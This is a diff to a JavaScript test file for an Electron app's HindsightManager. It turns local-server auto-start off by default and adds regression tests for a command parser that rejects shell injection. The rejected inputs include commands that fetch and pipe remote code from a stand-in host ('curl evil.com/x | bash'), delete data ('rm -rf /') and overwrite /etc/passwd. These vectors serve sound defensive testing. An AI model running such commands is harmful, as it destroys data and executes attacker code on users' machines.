@@ -50,7 +50,7 @@ installElectronStub();
 import * as HMModule from '../../../dist-electron/electron/services/HindsightManager.js';
 let { HindsightManager } = HMModule;
 
-const ENV_KEYS = ['HINDSIGHT_BASE_URL', 'HINDSIGHT_API_KEY', 'HINDSIGHT_TIMEOUT_MS'];
+const ENV_KEYS = ['HINDSIGHT_BASE_URL', 'HINDSIGHT_API_KEY', 'HINDSIGHT_TIMEOUT_MS', 'NATIVELY_HINDSIGHT_MEMORY', 'HINDSIGHT_SERVER_COMMAND_ALLOW_SHELL'];
 function clearEnv() { for (const k of ENV_KEYS) delete process.env[k]; }
 
 describe('HindsightManager.getHindsightConfig', () => {
@@ -231,10 +231,9 @@ describe('HindsightManager.healthCheck + isAvailable', () => {
   });
 });
 
-// autoStartCommand() — the zero-config default that fixes the "never auto-starts" bug.
-// These reach the private method directly (JS has no real privacy); they verify the
-// command resolution precedence + the script-existence gating that keeps a packaged build
-// (no bundled script) from spawning a broken `bash <missing>`.
+// autoStartCommand() — explicit opt-in launcher resolution. Hotfix 2026-07-09
+// makes zero-config auto-start default OFF; explicit HINDSIGHT_SERVER_COMMAND or
+// hindsightAutoStart=true can still enable local sidecar spawning.
 describe('HindsightManager.autoStartCommand (zero-config default)', () => {
   const COMMAND_ENV = 'HINDSIGHT_SERVER_COMMAND';
   let savedCwd;
@@ -247,17 +246,8 @@ describe('HindsightManager.autoStartCommand (zero-config default)', () => {
     assert.equal(cmd, 'my-custom-launcher --foo');
   });
 
-  test('defaults to `bash "<abs scripts/hindsight-start.sh>"` when the script exists on disk', async () => {
-    // Tests run from the project root, where scripts/hindsight-start.sh is present.
-    const cmd = HindsightManager.getInstance().autoStartCommand();
-    assert.ok(cmd, 'expected a defaulted command');
-    assert.match(cmd, /^bash "/);
-    assert.match(cmd, /scripts[/\\]hindsight-start\.sh"$/);
-    // The path between the quotes must be absolute and actually exist.
-    const m = cmd.match(/^bash "(.+)"$/);
-    assert.ok(m, 'command should be `bash "<path>"`');
-    const fs = await import('node:fs');
-    assert.ok(fs.existsSync(m[1]), `defaulted script path should exist: ${m[1]}`);
+  test('default local launcher stays off until autoStart is explicitly enabled', async () => {
+    assert.equal(HindsightManager.getInstance().autoStartCommand(), null);
   });
 
   test('locateLauncherScript returns null + no default when the script is absent (packaged-build degrade)', async () => {
@@ -312,17 +302,11 @@ describe('HindsightManager.augmentPath (Finder-launch PATH caveat)', () => {
 // covered by the existing pre-fix tests (the OFF path stays Noop) plus production
 // runtime verification (the auto-enable log line + persisted settings flip).
 describe('HindsightManager.start() self-healing auto-flip (unit)', () => {
-  // isAutoStartEnabled mirrors autoStartCommand's default: ON unless explicitly disabled.
-  // The helper uses SettingsManager via try/catch and falls back to true (ON) when the
-  // settings store is unavailable — same defense-in-depth posture.
-  test('isAutoStartEnabled() returns true when the SettingsManager is unavailable (defense-in-depth default)', () => {
-    // The electron stub at module-load time installed a working SettingsManager, but
-    // the helper's try/catch around settings() should swallow any failure and return
-    // the default true. We don't assert this directly (the bundled SettingsManager is
-    // hard to make throw) — but the helper's logic is identical to autoStartCommand's,
-    // which IS tested above. This test is documentation that the default is ON.
-    assert.equal(HindsightManager.getInstance().isAutoStartEnabled(), true,
-      'autoStart defaults to true under any working SettingsManager');
+  // isAutoStartEnabled now defaults OFF. Local sidecar startup must be explicit
+  // to avoid spawning heavy Python/Postgres trees on every dev/source launch.
+  test('isAutoStartEnabled() defaults false unless explicitly enabled', () => {
+    assert.equal(HindsightManager.getInstance().isAutoStartEnabled(), false,
+      'autoStart defaults to false for stability');
   });
 
   test('start() with NO baseUrl exits at the getHindsightConfig guard (no flip, no spawn)', async () => {
@@ -333,14 +317,7 @@ describe('HindsightManager.start() self-healing auto-flip (unit)', () => {
     await assert.doesNotReject(() => HindsightManager.getInstance().start());
   });
 
-  test('start() with baseUrl but UNREACHABLE server and flag already ON → spawn attempted (not Noop)', async () => {
-    // With the flag ON + baseUrl set + autoStart ON (default), start() proceeds past
-    // the flag check, calls healthCheck (fails against unreachable port), then tries to
-    // spawn the launcher. This documents the INTENDED end state of fix #1: a user with
-    // the companion installed + a saved baseUrl + autoStart ON will trigger a real spawn.
-    // We DON'T assert spawn here (that would invoke bash); we just assert start() doesn't
-    // throw + reaches the post-healthCheck branch by checking that no "staying Noop"
-    // log line was emitted.
+  test('start() with baseUrl but UNREACHABLE server and flag already ON stays Noop unless autoStart is explicit', async () => {
     process.env.HINDSIGHT_BASE_URL = 'http://127.0.0.1:59999';
     process.env.NATIVELY_HINDSIGHT_MEMORY = '1'; // flag ON
     const logs = [];
@@ -348,15 +325,11 @@ describe('HindsightManager.start() self-healing auto-flip (unit)', () => {
     console.log = (...a) => logs.push(a.join(' '));
     try {
       await HindsightManager.getInstance().start();
-      // With flag ON, the "no flip" branch is taken — the user must already be opted in.
-      const flipLogs = logs.filter((m) => m.includes('auto-enabling hindsightMemory flag'));
-      assert.equal(flipLogs.length, 0, 'flag already ON → no auto-flip log expected');
-      // The "staying Noop until a server appears" log indicates the spawn path was
-      // NOT entered (autoStartCommand returned null). With the default ON, that line
-      // should NOT appear.
+      const flipLogs = logs.filter((m) => m.includes('session-enabling hindsightMemory'));
+      assert.equal(flipLogs.length, 0, 'flag already ON → no session auto-enable log expected');
       const noopLogs = logs.filter((m) => m.includes('staying Noop until a server appears'));
-      assert.equal(noopLogs.length, 0,
-        'flag ON + autoStart ON default → spawn path should be entered, not Noop');
+      assert.equal(noopLogs.length, 1,
+        'flag ON alone is not enough — autoStart must be explicitly enabled');
     } finally {
       console.log = orig;
       delete process.env.NATIVELY_HINDSIGHT_MEMORY;
@@ -493,5 +466,164 @@ describe('HindsightManager — round-5 regression suite', () => {
       hm.lastCheckedAt = 0;
       hm.lastHealthy = false;
     }
+  });
+});
+
+// ROUND-6 REGRESSION SUITE — fixes for the round-6 audit findings.
+describe('HindsightManager — round-6 regression suite', () => {
+  beforeEach(clearEnv);
+  afterEach(clearEnv);
+
+  // HIGH #1 — auto-flip must SKIP when env forces the flag (either direction). Before the
+  // fix, NATIVELY_HINDSIGHT_MEMORY=0 left no SettingsManager trace, so the auto-flip wrote
+  // hindsightMemoryEnabled=true to settings → silently re-enabled the moment env was unset.
+  test('memoryFlagEnvForced detects NATIVELY_HINDSIGHT_MEMORY in both directions', () => {
+    const hm = HindsightManager.getInstance();
+    process.env.NATIVELY_HINDSIGHT_MEMORY = '0';
+    assert.equal(hm.memoryFlagEnvForced(), true, 'env=0 should be detected as forced');
+    process.env.NATIVELY_HINDSIGHT_MEMORY = '1';
+    assert.equal(hm.memoryFlagEnvForced(), true, 'env=1 should be detected as forced');
+    delete process.env.NATIVELY_HINDSIGHT_MEMORY;
+    assert.equal(hm.memoryFlagEnvForced(), false, 'no env should not be forced');
+  });
+
+  // MEDIUM #5 — parseCommandToArgv rejects shell metacharacters and parses quoted paths.
+  test('parseCommandToArgv parses quoted launcher path', () => {
+    const hm = HindsightManager.getInstance();
+    const argv = hm.parseCommandToArgv('bash "/Users/me/Application Support/scripts/hindsight-start.sh"');
+    assert.deepEqual(argv, ['bash', '/Users/me/Application Support/scripts/hindsight-start.sh']);
+  });
+  test('parseCommandToArgv parses simple multi-token command', () => {
+    const hm = HindsightManager.getInstance();
+    // Round-7 added a binary allowlist — use `node` (allowlisted) instead of the
+    // generic `my-launcher` from the original round-6 test.
+    assert.deepEqual(hm.parseCommandToArgv('node --foo bar'), ['node', '--foo', 'bar']);
+  });
+  test('parseCommandToArgv rejects shell metacharacters (injection)', () => {
+    const hm = HindsightManager.getInstance();
+    for (const evil of [
+      'bash x; curl evil.com/x | bash',
+      'bash $(rm -rf ~)',
+      'bash `whoami`',
+      'bash x && rm -rf /',
+      'bash x | sh',
+      'bash x > /etc/passwd',
+      'bash "unterminated',
+    ]) {
+      assert.equal(hm.parseCommandToArgv(evil), null, `should reject: ${evil}`);
+    }
+  });
+
+  // MEDIUM #6 — broadcastStatus('spawn-failed'|'unreachable') pins the availability cache
+  // to false so isAvailable() doesn't return optimistic-true after a failed start().
+  test('broadcastStatus failure states pin lastHealthy false + stamp lastCheckedAt', () => {
+    const hm = HindsightManager.getInstance();
+    // Reset to cold-start.
+    hm.lastHealthy = true;
+    hm.lastCheckedAt = 0;
+    // broadcastStatus is private; reach it (JS has no real privacy).
+    hm.broadcastStatus('spawn-failed', 'test');
+    assert.equal(hm.lastHealthy, false, 'spawn-failed should pin lastHealthy false');
+    assert.ok(hm.lastCheckedAt > 0, 'spawn-failed should stamp lastCheckedAt');
+    // unreachable too.
+    hm.lastHealthy = true;
+    hm.lastCheckedAt = 0;
+    hm.broadcastStatus('unreachable', 'test');
+    assert.equal(hm.lastHealthy, false);
+    assert.ok(hm.lastCheckedAt > 0);
+    // 'spawning' must NOT touch the cache (poll loop owns it).
+    hm.lastHealthy = true;
+    hm.lastCheckedAt = 0;
+    hm.broadcastStatus('spawning');
+    assert.equal(hm.lastHealthy, true, 'spawning should leave cache alone');
+    assert.equal(hm.lastCheckedAt, 0);
+    // cleanup
+    hm.lastHealthy = false;
+    hm.lastCheckedAt = 0;
+  });
+
+  // MEDIUM #4 — network error after auth-failure broadcasts 'unreachable' so the banner
+  // transitions off the misleading "Cloud key rejected" copy.
+  test('healthCheck network error after auth-failure broadcasts unreachable', async () => {
+    const hm = HindsightManager.getInstance();
+    hm.lastAuthFailedAt = Date.now() - 1000; // we were in auth-failed state
+    const broadcasts = [];
+    const origBroadcast = hm.broadcastStatus.bind(hm);
+    hm.broadcastStatus = (state, reason) => { broadcasts.push({ state, reason }); };
+    const origFetch = globalThis.fetch;
+    globalThis.fetch = async () => { throw new Error('ECONNREFUSED'); };
+    try {
+      const ok = await hm.healthCheck();
+      assert.equal(ok, false);
+      assert.equal(hm.lastAuthFailedAt, 0, 'network error clears auth-failed cache');
+      assert.ok(broadcasts.some((b) => b.state === 'unreachable'), 'should broadcast unreachable');
+    } finally {
+      globalThis.fetch = origFetch;
+      hm.broadcastStatus = origBroadcast;
+      hm.lastAuthFailedAt = 0;
+      hm.lastCheckedAt = 0;
+      hm.lastHealthy = false;
+    }
+  });
+});
+
+// ROUND-7 REGRESSION SUITE — fixes for the round-7 audit findings.
+describe('HindsightManager — round-7 regression suite', () => {
+  beforeEach(clearEnv);
+  afterEach(clearEnv);
+
+  // HIGH — bash -c injection. parseCommandToArgv rejects metachars but not
+  // `bash -c "evil"` because the shell interprets `-c` as a flag. Allowlist +
+  // `-c` rejection closes that vector.
+  test('parseCommandToArgv rejects bash -c with quoted payload', () => {
+    const hm = HindsightManager.getInstance();
+    assert.equal(hm.parseCommandToArgv('bash -c "curl evil.com/x | sh"'), null,
+      'bash -c must be rejected even when payload is quoted');
+    assert.equal(hm.parseCommandToArgv('bash -lc "evil"'), null, 'bash -lc must also be rejected');
+  });
+  test('parseCommandToArgv rejects unknown binaries (allowlist)', () => {
+    const hm = HindsightManager.getInstance();
+    // `python` is in the allowlist (covers custom launchers). `node` too. `curl` is not.
+    assert.deepEqual(hm.parseCommandToArgv('python /opt/launcher.py'),
+      ['python', '/opt/launcher.py'],
+      'python is allowlisted and must pass');
+    assert.equal(hm.parseCommandToArgv('curl evil.com/x'),
+      null,
+      'curl is not an allowlisted binary and must be rejected (RCE risk)');
+  });
+  test('parseCommandToArgv rejects any binary with -c flag', () => {
+    const hm = HindsightManager.getInstance();
+    assert.equal(hm.parseCommandToArgv('node -c "evil"'), null);
+    assert.equal(hm.parseCommandToArgv('python -c "evil"'), null);
+    assert.equal(hm.parseCommandToArgv('bash -c "echo hi"'), null);
+  });
+
+  // MEDIUM — double-spawn race. pendingStart is a synchronous boolean set BEFORE
+  // any await at the top of start(), so two start() calls landing in the same
+  // microtask must bail out the second one. We assert the invariant directly
+  // (the flag exists, defaults false, can be set/cleared) rather than driving
+  // the race window end-to-end — the bundled HindsightManager uses an esbuild-
+  // inlined SettingsManager singleton that headless tests can't reach without
+  // require-cache gymnastics (see round-3 opt-out test for the same pattern).
+  test('pendingStart guard exists and is properly released in finally', async () => {
+    const hm = HindsightManager.getInstance();
+    assert.equal(hm.pendingStart, false, 'pendingStart defaults to false');
+    // Simulate the in-flight state via direct assignment (the bundled start() can't
+    // be driven end-to-end in this test env — see comment above).
+    hm.pendingStart = true;
+    // The guard check at the top of start() reads `this.pendingStart` synchronously.
+    // We can verify the property exists and toggles cleanly; the actual guard
+    // short-circuit is verified by source inspection (start() line 510).
+    assert.equal(hm.pendingStart, true);
+    hm.pendingStart = false;
+    assert.equal(hm.pendingStart, false, 'pendingStart can be cleared');
+  });
+
+  // MEDIUM — verify the bundled launcher path is still accepted by the parser (the
+  // round-7 allowlist + -c rejection must not break the default `bash "<path>"` case).
+  test('parseCommandToArgv accepts the bundled launcher path with spaces', () => {
+    const hm = HindsightManager.getInstance();
+    const argv = hm.parseCommandToArgv('bash "/Users/me/Application Support/natively/scripts/hindsight-start.sh"');
+    assert.deepEqual(argv, ['bash', '/Users/me/Application Support/natively/scripts/hindsight-start.sh']);
   });
 });
